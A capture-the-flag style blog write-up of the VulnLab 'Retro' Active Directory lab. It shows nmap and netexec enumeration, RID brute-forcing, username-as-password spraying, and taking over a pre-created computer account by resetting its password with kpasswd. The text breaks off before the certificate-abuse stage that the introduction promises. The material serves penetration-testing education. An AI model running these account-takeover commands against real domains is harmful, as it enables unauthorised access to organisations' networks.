---
date: 2024-07-04
categories:
  - writeups
  - vulnlab
tags:
  - adcs
  - pre-created-computer-accounts
authors:
  - tomfieber
comments: true
---
# VulnLab: Retro


Retro is an **EASY** rated machine on [VulnLab](https://wiki.vulnlab.com/guidance/easy/retro). This machine involves abusing a flaw with pre-created computer accounts to change a password and take over control of the account. From there, abuse an AD CS misconfiguration to obtain a certificate as a domain administrator that can be used for authentication to the domain controller. 

<!-- more -->
![](../images/vulnlab_retro/retro.png)

## Enumeration
### Nmap

```console
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-07-04 15:04:07Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA/domainComponent=retro
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-04T14:45:48
| Not valid after:  2025-07-04T14:45:48
| MD5:   b521:4db7:959d:8255:ce20:7ff1:8455:44f3
| SHA-1: 2c90:5a76:83d3:eeb6:13ac:8cce:b456:91c6:a514:baeb
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBPagAwIBAgITJgAAAAcYs2Ns/jHeNAAAAAAABzANBgkqhkiG9w0BAQsF
| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU
| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQwNzA0MTQ0NTQ4WhcNMjUwNzA0MTQ0
| NTQ4WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAOgTELs6vjluN3mt2fyU4vpzox+gLEDS3ozNDKZVdaaLYiE2
| FcGOUWedlKkepT732TBkXPM2asajykmycj3QZpO2aWKXktb90xcO89zdAd9Kupxx
| 7mU2JHYPuccb1TktEdJIglFHb1VsElqv4bzfeN3szej/W0ShU9HQcPQpiOfUBbUd
| cQjQBgv2zMLeD443mmfausFNilhJeozfsFUjJlZr5Bd0KSFvsXBvTw29a0HwYuF8
| p2vYHmXnG6Cg/uwb2EHDEGi2zuh1AahzkMiyHn3WbxrNzqNHi6zc5AsCOYkhkt7H
| Suw1WRsncH3C6z+GfOYNZWPMbDz2k9ytvKIC7VECAwEAAaOCAygwggMkMC8GCSsG
| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV
| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG
| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg
| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw
| BwYFKw4DAgcwCgYIKoZIhvcNAwcwNwYDVR0RBDAwLqAfBgkrBgEEAYI3GQGgEgQQ
| yLv8MaLCl0S4TFuXub2nKoILREMucmV0cm8udmwwHQYDVR0OBBYEFEizNO44LO6t
| Fu7VoXyZzmA4XTuTMB8GA1UdIwQYMBaAFDg6yqfPu6RkQ20kT5QJ8b3pa05eMIHB
| BgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFwOi8vL0NOPXJldHJvLURDLUNBLENO
| PURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl
| cyxDTj1Db25maWd1cmF0aW9uLERDPXJldHJvLERDPXZsP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBugYIKwYBBQUHAQEEga0wgaowgacGCCsGAQUFBzAChoGabGRhcDovLy9DTj1y
| ZXRyby1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1yZXRybyxEQz12bD9jQUNlcnRp
| ZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBO
| BgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk4MzU0
| Nzc1NS02OTgyNjAxMzYtNDI4MzkxODE3Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IC
| AQCcIarI/KSW6gMuKgTtljrGngCZ3jsZyEfThxk9CFDRV/9BOZ/Of6SjWKTbinRw
| TpPlb1TeY4MMDzmcxwZk3z1fD37NvKIGVBtO1CBncJVCVFwvuRysRCJWZqX3/Jh1
| FiZM4RrCmi8hpWXLUfWhgp43LesHxcibJL+mZLqo4uyH0fXDHDaHkkKiZGsaEPb+
| grVpXpLZuUj8AiUzuPZVFs293yYGBo8w+DRDKTDg9ei7OUQyAlHJ7Ek3ddUJJnWy
| YO81QtIFKiePSBEJs+tXd/p3f/5Y8Z4yhSf+Q3ost0cPw5e6dPVTlEcxcNpmfhjx
| kNN/gn9mXDlHhB3w+6/ixoFYBZP/kLK90aXv69ypI/x3MpXsbQ9XP9sFdd/LRz2a
| SFkz71zx0kuI9hdfDMkbePd5eLXGC7ATq2oLwfIlZ+dZAYGlihQ4JLFFccsHKb98
| alxJngkA/7fqeFScSyxr56XGzsaFhQ7WeoAfJci3VqCppXAygPIY9y77s6JdMb4B
| N++gu864u2CbdaFLpAJfzQIsQgH48EPC7phHs/Rus+Ut4vuKA8H2vCeGCGICtvLX
| 6Uvp6QakYNI9D7yIrL+k+JvOI4Rn1ft6H4Cs8zwqcLQKKn4AF/MjrqZw7UdyWXJd
| wBuJAsNeXIMHejFcJVqNHdSQQrq34kmqmkKuncOQJZMQeQ==
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA/domainComponent=retro
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-04T14:45:48
| Not valid after:  2025-07-04T14:45:48
| MD5:   b521:4db7:959d:8255:ce20:7ff1:8455:44f3
| SHA-1: 2c90:5a76:83d3:eeb6:13ac:8cce:b456:91c6:a514:baeb
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBPagAwIBAgITJgAAAAcYs2Ns/jHeNAAAAAAABzANBgkqhkiG9w0BAQsF
| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU
| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQwNzA0MTQ0NTQ4WhcNMjUwNzA0MTQ0
| NTQ4WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAOgTELs6vjluN3mt2fyU4vpzox+gLEDS3ozNDKZVdaaLYiE2
| FcGOUWedlKkepT732TBkXPM2asajykmycj3QZpO2aWKXktb90xcO89zdAd9Kupxx
| 7mU2JHYPuccb1TktEdJIglFHb1VsElqv4bzfeN3szej/W0ShU9HQcPQpiOfUBbUd
| cQjQBgv2zMLeD443mmfausFNilhJeozfsFUjJlZr5Bd0KSFvsXBvTw29a0HwYuF8
| p2vYHmXnG6Cg/uwb2EHDEGi2zuh1AahzkMiyHn3WbxrNzqNHi6zc5AsCOYkhkt7H
| Suw1WRsncH3C6z+GfOYNZWPMbDz2k9ytvKIC7VECAwEAAaOCAygwggMkMC8GCSsG
| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV
| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG
| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg
| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw
| BwYFKw4DAgcwCgYIKoZIhvcNAwcwNwYDVR0RBDAwLqAfBgkrBgEEAYI3GQGgEgQQ
| yLv8MaLCl0S4TFuXub2nKoILREMucmV0cm8udmwwHQYDVR0OBBYEFEizNO44LO6t
| Fu7VoXyZzmA4XTuTMB8GA1UdIwQYMBaAFDg6yqfPu6RkQ20kT5QJ8b3pa05eMIHB
| BgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFwOi8vL0NOPXJldHJvLURDLUNBLENO
| PURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl
| cyxDTj1Db25maWd1cmF0aW9uLERDPXJldHJvLERDPXZsP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBugYIKwYBBQUHAQEEga0wgaowgacGCCsGAQUFBzAChoGabGRhcDovLy9DTj1y
| ZXRyby1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1yZXRybyxEQz12bD9jQUNlcnRp
| ZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBO
| BgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk4MzU0
| Nzc1NS02OTgyNjAxMzYtNDI4MzkxODE3Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IC
| AQCcIarI/KSW6gMuKgTtljrGngCZ3jsZyEfThxk9CFDRV/9BOZ/Of6SjWKTbinRw
| TpPlb1TeY4MMDzmcxwZk3z1fD37NvKIGVBtO1CBncJVCVFwvuRysRCJWZqX3/Jh1
| FiZM4RrCmi8hpWXLUfWhgp43LesHxcibJL+mZLqo4uyH0fXDHDaHkkKiZGsaEPb+
| grVpXpLZuUj8AiUzuPZVFs293yYGBo8w+DRDKTDg9ei7OUQyAlHJ7Ek3ddUJJnWy
| YO81QtIFKiePSBEJs+tXd/p3f/5Y8Z4yhSf+Q3ost0cPw5e6dPVTlEcxcNpmfhjx
| kNN/gn9mXDlHhB3w+6/ixoFYBZP/kLK90aXv69ypI/x3MpXsbQ9XP9sFdd/LRz2a
| SFkz71zx0kuI9hdfDMkbePd5eLXGC7ATq2oLwfIlZ+dZAYGlihQ4JLFFccsHKb98
| alxJngkA/7fqeFScSyxr56XGzsaFhQ7WeoAfJci3VqCppXAygPIY9y77s6JdMb4B
| N++gu864u2CbdaFLpAJfzQIsQgH48EPC7phHs/Rus+Ut4vuKA8H2vCeGCGICtvLX
| 6Uvp6QakYNI9D7yIrL+k+JvOI4Rn1ft6H4Cs8zwqcLQKKn4AF/MjrqZw7UdyWXJd
| wBuJAsNeXIMHejFcJVqNHdSQQrq34kmqmkKuncOQJZMQeQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA/domainComponent=retro
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-04T14:45:48
| Not valid after:  2025-07-04T14:45:48
| MD5:   b521:4db7:959d:8255:ce20:7ff1:8455:44f3
| SHA-1: 2c90:5a76:83d3:eeb6:13ac:8cce:b456:91c6:a514:baeb
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBPagAwIBAgITJgAAAAcYs2Ns/jHeNAAAAAAABzANBgkqhkiG9w0BAQsF
| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU
| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQwNzA0MTQ0NTQ4WhcNMjUwNzA0MTQ0
| NTQ4WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAOgTELs6vjluN3mt2fyU4vpzox+gLEDS3ozNDKZVdaaLYiE2
| FcGOUWedlKkepT732TBkXPM2asajykmycj3QZpO2aWKXktb90xcO89zdAd9Kupxx
| 7mU2JHYPuccb1TktEdJIglFHb1VsElqv4bzfeN3szej/W0ShU9HQcPQpiOfUBbUd
| cQjQBgv2zMLeD443mmfausFNilhJeozfsFUjJlZr5Bd0KSFvsXBvTw29a0HwYuF8
| p2vYHmXnG6Cg/uwb2EHDEGi2zuh1AahzkMiyHn3WbxrNzqNHi6zc5AsCOYkhkt7H
| Suw1WRsncH3C6z+GfOYNZWPMbDz2k9ytvKIC7VECAwEAAaOCAygwggMkMC8GCSsG
| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV
| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG
| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg
| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw
| BwYFKw4DAgcwCgYIKoZIhvcNAwcwNwYDVR0RBDAwLqAfBgkrBgEEAYI3GQGgEgQQ
| yLv8MaLCl0S4TFuXub2nKoILREMucmV0cm8udmwwHQYDVR0OBBYEFEizNO44LO6t
| Fu7VoXyZzmA4XTuTMB8GA1UdIwQYMBaAFDg6yqfPu6RkQ20kT5QJ8b3pa05eMIHB
| BgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFwOi8vL0NOPXJldHJvLURDLUNBLENO
| PURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl
| cyxDTj1Db25maWd1cmF0aW9uLERDPXJldHJvLERDPXZsP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBugYIKwYBBQUHAQEEga0wgaowgacGCCsGAQUFBzAChoGabGRhcDovLy9DTj1y
| ZXRyby1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1yZXRybyxEQz12bD9jQUNlcnRp
| ZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBO
| BgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk4MzU0
| Nzc1NS02OTgyNjAxMzYtNDI4MzkxODE3Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IC
| AQCcIarI/KSW6gMuKgTtljrGngCZ3jsZyEfThxk9CFDRV/9BOZ/Of6SjWKTbinRw
| TpPlb1TeY4MMDzmcxwZk3z1fD37NvKIGVBtO1CBncJVCVFwvuRysRCJWZqX3/Jh1
| FiZM4RrCmi8hpWXLUfWhgp43LesHxcibJL+mZLqo4uyH0fXDHDaHkkKiZGsaEPb+
| grVpXpLZuUj8AiUzuPZVFs293yYGBo8w+DRDKTDg9ei7OUQyAlHJ7Ek3ddUJJnWy
| YO81QtIFKiePSBEJs+tXd/p3f/5Y8Z4yhSf+Q3ost0cPw5e6dPVTlEcxcNpmfhjx
| kNN/gn9mXDlHhB3w+6/ixoFYBZP/kLK90aXv69ypI/x3MpXsbQ9XP9sFdd/LRz2a
| SFkz71zx0kuI9hdfDMkbePd5eLXGC7ATq2oLwfIlZ+dZAYGlihQ4JLFFccsHKb98
| alxJngkA/7fqeFScSyxr56XGzsaFhQ7WeoAfJci3VqCppXAygPIY9y77s6JdMb4B
| N++gu864u2CbdaFLpAJfzQIsQgH48EPC7phHs/Rus+Ut4vuKA8H2vCeGCGICtvLX
| 6Uvp6QakYNI9D7yIrL+k+JvOI4Rn1ft6H4Cs8zwqcLQKKn4AF/MjrqZw7UdyWXJd
| wBuJAsNeXIMHejFcJVqNHdSQQrq34kmqmkKuncOQJZMQeQ==
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
|_ssl-date: 2024-07-04T15:04:55+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-07-04T15:04:15+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Issuer: commonName=DC.retro.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-03T14:54:33
| Not valid after:  2025-01-02T14:54:33
| MD5:   ffe1:2ad8:4117:4568:d611:7914:ebb1:55ee
| SHA-1: b8d3:ebe0:0f22:16f8:3dda:1fc4:85e4:7a3f:fedc:f749
| -----BEGIN CERTIFICATE-----
| MIIC2jCCAcKgAwIBAgIQFdODfzdLvL5J3XDHt1LQ2TANBgkqhkiG9w0BAQsFADAW
| MRQwEgYDVQQDEwtEQy5yZXRyby52bDAeFw0yNDA3MDMxNDU0MzNaFw0yNTAxMDIx
| NDU0MzNaMBYxFDASBgNVBAMTC0RDLnJldHJvLnZsMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAyZHMAjboQwXUiBzlJAcCAa1bFfTKHC7O2saNi/FdCRIz
| 3iBLeBoCWN7YOPHjBVkNJFJTqrgZl3BX7oOSZ+QOIimJqgYu98zNUuZUf4sxC7MB
| 3gem6bhPKuU0Zylj0Krl9j+fLMO5uB7hNc0elTyG0xss3Q/bvlA10A7yl7+iOPp/
| 5yNkC/UksecJ2W9IybMNuygdaD3QPieaG3pwqfxp1NXmZQfBDuC7wKLLjBnvmvWm
| 9fQUa1v/Wb+eZ6xuNCshfkRg5uH5wEHFp9mppIlAp9OXpqM5jyHX9kZX3KGktchS
| JBl8edLWpfBgmn8fXRBjUeGvnnPIsp+GsQHhPwchPQIDAQABoyQwIjATBgNVHSUE
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAB6b
| V8+nHs3eRQrrz9pOxuqfFwUPtqs5LXtYPErxfIjoNzgdz7PBYF3lDCpwAwX0ChyH
| TyZGWnQLfUDvNv3XyQ3OLlGy6MnDfVPukbn/EDgpX78cJREqv7jgIaivIRE/TnGk
| 9BdZEDf6gqd+rxWVdOzEq3HhcHi17QGKeQujx3+jiKlflHkuV5jH/ZlAapXYRhJ2
| L5YhhHNxGK54PxDL7QVs7IVt06PGOn/6i5Tgeh/w8O0f4Bqt1orob6vaZxKCjAYy
| ljrbSm8pBDnN6ylQxF/kh7LMpjt4ru7WkTgu3Px7lgBDL2onqBnRK24pna/gQ/DZ
| 1rHj6K+M9vMhQIHsQ1Y=
|_-----END CERTIFICATE-----
49672/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 30448/tcp): CLEAN (Timeout)
|   Check 2 (port 50684/tcp): CLEAN (Timeout)
|   Check 3 (port 47219/udp): CLEAN (Timeout)
|   Check 4 (port 49250/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2024-07-04T15:04:16
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

We can see from the nmap scan that there are a fair number of ports open. Additionally, it is likely that this machine is a domain controller based on the presence of Kerberos (port 88), LDAP (ports 389/636), etc. 
### Service Enumeration

#### SMB

We can get the general information for the SMB service using `netexec`. As shown below, the machine name is `DC` and the domain is `retro.vl`. 

```console
➜  retro nxc smb $ip
SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
```

Another check reveals that we have anonymous access to a number of shares, including the `Trainees` share, as well as the `IPC$` share. 

```console
➜  retro nxc smb $ip -u 'anonymous' -p '' --shares
SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.88.241    445    DC               [+] retro.vl\anonymous: (Guest)
SMB         10.10.88.241    445    DC               [*] Enumerated shares
SMB         10.10.88.241    445    DC               Share           Permissions     Remark
SMB         10.10.88.241    445    DC               -----           -----------     ------
SMB         10.10.88.241    445    DC               ADMIN$                          Remote Admin
SMB         10.10.88.241    445    DC               C$                              Default share
SMB         10.10.88.241    445    DC               IPC$            READ            Remote IPC
SMB         10.10.88.241    445    DC               NETLOGON                        Logon server share
SMB         10.10.88.241    445    DC               Notes
SMB         10.10.88.241    445    DC               SYSVOL                          Logon server share
SMB         10.10.88.241    445    DC               Trainees        READ
```

With read access to the `IPC$` share, we can use the `--rid-brute` method in `netexec` to get a list of domain user and group objects. 

```console
➜  retro nxc smb $ip -u 'anonymous' -p '' --rid-brute
SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.88.241    445    DC               [+] retro.vl\anonymous: (Guest)
SMB         10.10.88.241    445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.88.241    445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.10.88.241    445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.10.88.241    445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.10.88.241    445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.10.88.241    445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.10.88.241    445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.10.88.241    445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.10.88.241    445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.10.88.241    445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.10.88.241    445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.10.88.241    445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.10.88.241    445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.88.241    445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.88.241    445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.88.241    445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.10.88.241    445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.10.88.241    445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.88.241    445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.88.241    445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.88.241    445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.88.241    445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.10.88.241    445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.10.88.241    445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.88.241    445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.10.88.241    445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.10.88.241    445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.10.88.241    445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.10.88.241    445    DC               1109: RETRO\tblack (SidTypeUser)
```

Narrowing this down to just the `SidTypeUser` objects, we get this list. We could remove the `krbtgt` user from this list because it's not a user that would be logging into anything. 

```console
Administrator
Guest
krbtgt
DC$
trainee
BANKING$
jburley
tblack
```

Now that we have a list of users, we can set that aside for a moment and check the shares to which we have anonymous access.  

```console
➜  retro smbclient.py -dc-ip $ip anonymous@$ip
Impacket v0.12.0.dev1+20240626.193148.f827c8c7 - Copyright 2023 Fortra

Password:
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Notes
SYSVOL
Trainees
```

Checking the `Trainees` share, we find a text file named `Important.txt` that we can grab. 

```console
# use Trainees
# ls
drw-rw-rw-          0  Sun Jul 23 17:16:11 2023 .
drw-rw-rw-          0  Wed Jul 26 04:54:14 2023 ..
-rw-rw-rw-        288  Sun Jul 23 17:16:11 2023 Important.txt
# get Important.txt
```

The `Important.txt` file includes a hint that all trainees are now lumped under one account with a common password. 

```console
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

Since there's no other files present that might contain credentials, we can try spraying weak and/or common credentials against the list of usernames we enumerated earlier. We can also check to see if any users are using their username as a password. 

Doing this, we find that `trainee:trainee` worked. 

```console
➜  retro nxc smb $ip -u users -p users --no-bruteforce --continue-on-success
SMB         10.10.88.241    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.88.241    445    DC               [-] retro.vl\Administrator:Administrator STATUS_LOGON_FAILURE
SMB         10.10.88.241    445    DC               [-] retro.vl\Guest:Guest STATUS_LOGON_FAILURE
SMB         10.10.88.241    445    DC               [-] retro.vl\DC$:DC$ STATUS_LOGON_FAILURE
SMB         10.10.88.241    445    DC               [+] retro.vl\trainee:trainee
SMB         10.10.88.241    445    DC               [-] retro.vl\BANKING$:BANKING$ STATUS_LOGON_FAILURE
SMB         10.10.88.241    445    DC               [-] retro.vl\jburley:jburley STATUS_LOGON_FAILURE
SMB         10.10.88.241    445    DC               [-] retro.vl\tblack:tblack STATUS_LOGON_FAILURE
```

Checking share permissions again with that user shows that we now have access to the `Notes` share. Looking into that share with `smbclient.py` we find a text file named `ToDo.txt`. 

 We can get `ToDo.txt` out of the Notes share and read it. 

```console
➜  retro smbclient.py -dc-ip $ip trainee:trainee@$ip
Impacket v0.12.0.dev1+20240626.193148.f827c8c7 - Copyright 2023 Fortra

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Notes
SYSVOL
Trainees
# use Notes
# ls
drw-rw-rw-          0  Sun Jul 23 17:03:16 2023 .
drw-rw-rw-          0  Wed Jul 26 04:54:14 2023 ..
-rw-rw-rw-        248  Sun Jul 23 17:05:56 2023 ToDo.txt
# get ToDo.txt
```

The contents of the `ToDo.txt` file indicate that there is a pre-created computer account in use in the environment. 

```console
➜  retro cat ToDo.txt
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James 
```

## Foothold

Digging into the following article gives us an idea of the way ahead. 

[TrustedSec: Diving Into Pre-Created Computer Accounts](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts)

Essentially, if the computer account was created with the `Assign this computer account as a pre-Windows 2000 computer` option checked, the password will be the same as the computer name, except lowercase and without the "$" at the end.

We also find some useful information in a [Wayback archive](https://web.archive.org/web/20080205233505/http://support.microsoft.com/kb/320187). 

![](../images/screenshots/Pasted%20image%2020240704145857.png)

So in our case, we can test the `banking$` account with the password `banking`. Using `netexec`, I did get the `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` error message described in the article. 

Working on the assumption that the `banking$` account was created as a pre-Windows 2000 computer, we can attempt to change the password for the `banking$` machine account

```console
➜  retro kpasswd banking$
Password for banking$@RETRO.VL:
Enter new password:
Enter it again:
Password changed.
```

Perfect! That worked, but please note that I needed to make some modifications to the `/etc/krb5.conf` file prior to changing the password. 

```console
➜  retro cat /etc/krb5.conf
[libdefaults]
        default_realm = RETRO.VL
        dns_lookup_realm = false
        ticket_lifetime = 24h
        renew_lifetime = 7d
        rdns = false
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true


[realms]
        RETRO.VL = {
                kdc = DC.RETRO.VL
                admin_server = DC.RETRO.VL
                }
```

We can now authenticate with the new password. 

```console
